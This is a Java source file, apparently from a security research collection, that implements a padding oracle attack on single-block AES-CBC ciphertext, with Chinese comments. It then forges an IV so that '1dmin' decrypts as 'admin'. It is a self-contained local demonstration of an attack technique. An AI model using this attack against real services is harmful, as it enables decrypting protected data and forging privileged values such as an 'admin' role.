package com.threedr3am.bug.paddingoraclecbc;

import com.vip.vjtools.vjkit.security.CryptoUtil;
import com.vip.vjtools.vjkit.text.EncodeUtil;

/**
 * padding oracle cbc java实现（单组 <= 16bytes 密文实现）
 *
 * todo 用于padding oracle爆破单组密文的原文，然后cbc攻击修改iv，使密文解密可以变成我们预期的明文
 *
 * @author threedr3am
 */
public class PaddingOracleCBC {
  public static void main(String[] args) {
    System.out.println(EncodeUtil.encodeBase64(CryptoUtil.generateIV()));
    System.out.println(EncodeUtil.encodeBase64(CryptoUtil.generateAesKey()));
    String aesIv = "BSiv194+mpLpYJDOsuuBYA==";
    String aesKey = "e/ACMnCbFqab+v/cCIv3gA==";
    String plain = "1dmin";
    byte[] cryptText = CryptoUtil.aesEncrypt(plain.getBytes(), EncodeUtil.decodeBase64(aesKey), EncodeUtil.decodeBase64(aesIv));
    byte[] ivBytesOld = EncodeUtil.decodeBase64(aesIv);
    byte[] ivBytes = EncodeUtil.decodeBase64(aesIv);


    byte[] middle = new byte[16];
    //用于填充的tmp值，第一轮为0x01第二轮为0x02以此类推
    byte tmp = 1;
    for (int i = 15; i >= 0; i--) {
      for (int j = 0; j < 256; j++) {
        try {
          ivBytes[i] = (byte) j;
          for (int k = 15; k > i ; k--) {
            //爆破倒数第一位时不需要填充，倒数第二位时填充其后的iv为0x02，倒数第三位时填充其后的iv为0x03，以此类推
            ivBytes[k] = (byte) (middle[k] ^ tmp);
          }
          //解密不报错，则为符合
          CryptoUtil.aesDecrypt(cryptText, EncodeUtil.decodeBase64(aesKey), ivBytes);
          //爆破倒数第一位的解密结果为0x01，第二位为0x02，以此类推，那么middle = iv ^ plain
          byte m = (byte) (j ^ tmp);
          middle[i] = m;
          System.out.println("middle["+i+"]="+((int)middle[i]));
        } catch (Exception e) {
        }
      }
      tmp++;
    }




    for (int i = 0; i < middle.length; i++) {
      System.out.print(((int)middle[i]));
      if (i != middle.length - 1) {
        System.out.print(",");
      }
    }
    System.out.println();
    byte[] res = new byte[16];
    for (int i = 0; i < 16; i++) {
      res[i] = (byte) (ivBytesOld[i] ^ middle[i]);
    }
    System.out.println(new String(res));


    //原来的iv ^ middle = plain
    //构造新的iv ^ middle = 'admin' -> 新的iv = middle ^ 'admin'
    String cbcRes = "admin";
    byte[] cbcResBytes = cbcRes.getBytes();
    //计算需要填充的位数
    int padding = 16 - cbcResBytes.length;
    byte[] cbcResBytesForPadding = new byte[cbcResBytes.length + padding];
    for (int i = 0; i < cbcResBytes.length; i++) {
      cbcResBytesForPadding[i] = cbcResBytes[i];
    }
    //填充
    for (int i = 1; i <= padding; i++) {
      cbcResBytesForPadding[cbcResBytesForPadding.length - i] = (byte) padding;
    }
    //构造新的iv，cbc攻击
    byte[] ivBytesNew = new byte[cbcResBytesForPadding.length];
    for (int i = 0; i < cbcResBytesForPadding.length; i++) {
      ivBytesNew[i] = (byte) (cbcResBytesForPadding[i] ^ middle[i]);
    }

    System.out.println(CryptoUtil
        .aesDecrypt(cryptText, EncodeUtil.decodeBase64(aesKey), ivBytesNew));
  }
}
